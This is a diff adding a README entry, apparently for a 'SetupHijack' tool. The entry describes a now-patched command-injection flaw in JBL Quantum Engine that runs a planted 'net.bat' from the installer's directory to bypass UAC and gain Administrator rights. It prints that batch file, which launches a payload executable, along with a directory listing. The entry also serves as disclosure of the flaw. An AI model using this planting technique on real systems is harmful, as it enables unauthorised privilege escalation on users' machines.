@@ -215,6 +215,32 @@ Targeting a single directory (such as `%TEMP%`) at a time can increase the likel
 
 - Cursor IDE has been observed creating .bat files and command history in %TEMP% that can be exploited. 
 
+
+- JBL Quantum Engine contains a (now patched) Command Injection flaw that runs "net" (including .bat) from the
+  same directory JBL_QuantumENGINE_1.11.0.1511_x64 is executed from. The latest version uses a new installer that
+  is not vulnerable to this specific command injection flaw (JBL_QuantumENGINE_Installer_2.2.13_x64.exe). This
+  issue was discovered as 0day in November 2022. It can be used to bypass UAC restrictions and gain elevated 
+  Administrator rights. The SYSTEM service writes bat files under %TEMP% for debugging/diagnostics. ;-)
+
+
+```
+C:\Users\Fantastic\Desktop\Sayuri\JBL_and_WinAudioCore_0day>type net.bat
+@echo off
+REM install.bat - runs the payload for SetupHijack
+start "" "c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe"
+
+C:\Users\Fantastic\Desktop\Sayuri\JBL_and_WinAudioCore_0day>dir JBL_QuantumENGINE_1.11.0.1511_x64.exe
+ Volume in drive C has no label.
+ Volume Serial Number is 48EC-B703
+
+ Directory of C:\Users\Fantastic\Desktop\Sayuri\JBL_and_WinAudioCore_0day
+
+11/20/2022  11:54 AM       139,327,096 JBL_QuantumENGINE_1.11.0.1511_x64.exe
+               1 File(s)    139,327,096 bytes
+               0 Dir(s)  237,500,821,504 bytes free
+``` 
+
+
 ---
 
 These files are available under an Attribution-NonCommercial-NoDerivatives 4.0 International license.
